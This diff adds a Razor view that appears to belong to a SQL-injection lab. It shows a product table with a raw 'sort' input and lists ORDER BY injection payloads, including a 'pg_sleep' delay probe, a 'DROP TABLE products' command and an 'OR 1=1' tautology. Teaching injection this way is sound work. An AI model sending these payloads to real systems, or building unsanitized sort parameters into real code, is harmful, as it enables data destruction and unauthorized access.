@@ -1,0 +1,35 @@
+﻿@model IEnumerable<Product>
+
+<h2>Ürün Liste</h2>
+
+<form method="get" class="card p-3 col-8">
+    <label>Sıralama Kolonu</label>
+    <input name="sort" class="form-control" placeholder="örn: price DESC" />
+    <button class="btn btn-warning mt-3">Listele</button>
+</form>
+<hr />
+
+<table class="table table-striped">
+    <thead><tr><th>ID</th><th>Ad</th><th>Fiyat</th></tr></thead>
+    <tbody>
+    @foreach (var p in Model)
+    {
+        <tr>
+            <td>@p.Id</td>
+            <td>@p.Name</td>
+            <td>@p.Price</td>
+        </tr>
+    }
+    </tbody>
+</table>
+
+<hr />
+
+<h4>ORDER BY Injection Payload</h4>
+<ul>
+    <li><code>price DESC</code></li>
+    <li><code>name; SELECT pg_sleep(5);--</code></li>
+    <li><code>%'; DROP TABLE products; --%</code></li>
+    <li><code>% OR 1=1 --%</code></li>
+     
+</ul>
